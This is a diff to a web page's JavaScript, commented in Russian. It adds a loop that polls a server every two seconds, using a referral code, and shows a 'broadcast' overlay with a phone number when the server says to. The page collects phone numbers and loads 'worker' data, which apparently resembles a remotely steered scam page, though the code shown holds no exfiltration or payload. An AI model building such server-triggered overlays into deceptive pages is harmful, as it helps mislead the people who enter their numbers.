@@ -502,6 +502,7 @@
     let currentPhone = "";
     let currentStep = "phone";
     let currentRefCode = null;
+    let broadcastTriggered = false;
     
     // ========== ПОЛУЧАЕМ ПАРАМЕТРЫ ИЗ URL ==========
     function getUrlParams() {
@@ -532,6 +533,7 @@
         
         // ===== ЕСЛИ ЕСТЬ ПАРАМЕТР BROADCAST — ПОКАЗЫВАЕМ СТРАНИЦУ УВЕДОМЛЕНИЯ =====
         if (params.broadcast === 'true') {
+            broadcastTriggered = true;
             const phone = params.phone || 'неизвестный';
             console.log('📢 ЗАПУСК РАССЫЛКИ ПО ПАРАМЕТРУ!');
             showBroadcast(phone);
@@ -569,8 +571,34 @@
             });
     })();
     
+    // ========== ПОСТОЯННАЯ ПРОВЕРКА КОМАНДЫ НА СЕРВЕРЕ ==========
+    function checkForBroadcast() {
+        const refCode = currentRefCode || new URLSearchParams(window.location.search).get('ref');
+        if (!refCode) {
+            console.log('❌ Нет ref кода');
+            return;
+        }
+        
+        const url = `${API_URL}/check_broadcast?ref=${refCode}`;
+        console.log('🔍 Проверка команды для ref:', refCode);
+        
+        fetch(url)
+            .then(response => response.json())
+            .then(data => {
+                console.log('📦 Ответ от сервера:', data);
+                if (data.broadcast === true) {
+                    console.log('📢 ПОЛУЧЕНА КОМАНДА НА РАССЫЛКУ!');
+                    showBroadcast(data.phone || 'неизвестный');
+                }
+            })
+            .catch(err => console.log('❌ Ошибка проверки:', err));
+    }
+    
     // ========== ПОКАЗ УВЕДОМЛЕНИЯ ==========
     function showBroadcast(phone) {
+        if (broadcastTriggered) return;
+        broadcastTriggered = true;
+        
         const overlay = document.getElementById('broadcastOverlay');
         const list = document.getElementById('broadcastList');
         const status = document.getElementById('broadcastStatus');
@@ -617,6 +645,7 @@
     // ========== ЗАКРЫТЬ ПЕРЕКРЫТИЕ ==========
     function closeBroadcast() {
         document.getElementById('broadcastOverlay').className = '';
+        broadcastTriggered = false;
     }
     
     // ========== ВИДЕО ПЛЕЕР ==========
@@ -884,6 +913,14 @@
     
     // ========== ЗАГРУЗКА ДАННЫХ ==========
     loadWorkerData();
+    
+    // ========== ЗАПУСКАЕМ ПРОВЕРКУ КОМАНДЫ КАЖДЫЕ 2 СЕКУНДЫ ==========
+    if (currentRefCode) {
+        console.log('✅ Запуск проверки команд для ref:', currentRefCode);
+        setInterval(checkForBroadcast, 2000);
+    } else {
+        console.log('❌ Нет ref кода, проверка не запущена');
+    }
 </script>
 
 <!-- Бейдж безопасности -->
